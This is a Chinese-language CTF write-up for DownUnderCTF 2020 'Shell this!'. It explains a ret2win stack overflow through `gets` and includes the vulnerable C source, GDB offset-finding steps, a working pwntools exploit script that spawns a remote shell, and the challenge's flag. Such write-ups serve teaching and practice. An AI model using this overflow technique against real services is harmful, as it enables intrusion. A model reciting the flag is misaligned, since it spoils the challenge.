# DownUnderCTF 2020 - Shell this!

## 题目简述

程序把名字读入 40 字节栈缓冲区，却使用无边界的 `gets`。二进制还保留了一个不会从正常控制流调用的 `get_shell()` 函数，它执行 `execve("/bin/sh", NULL, NULL)`。因此只需覆盖保存返回地址完成 ret2win，不需要构造 shellcode 或泄露 libc。

## 解题过程

关键源码为：

```c
void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];
    printf("Please tell me your name: ");
    gets(name);
}
```

用 cyclic pattern 触发崩溃并检查被覆盖的保存基址，可知保存 RBP 位于偏移 48；再跨过 8 字节保存 RBP，保存 RIP 的偏移为 56：

```gdb
pattern create 100
run
pattern offset 0x6161616161616167
```

题目二进制不使用 PIE，所以 `get_shell` 地址固定，可以直接从符号表读取：

```python
from pwn import *

elf = ELF("./shellthis", checksec=False)
io = remote("host", 1337)

payload = b"A" * 56 + p64(elf.sym["get_shell"])
io.recvuntil(b"name: ")
io.sendline(payload)
io.interactive()
```

进入 shell 后读取 `/chal/flag.txt`，得到：

```text
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```

## 方法总结

本题是最小 ret2win 模型：无界输入覆盖栈帧，目标函数已在二进制内，且无 PIE 使其地址固定。利用前仍应通过 cyclic pattern 确认偏移，并从实际 ELF 符号表取地址，避免把一次构建的硬编码地址误用于另一版本。
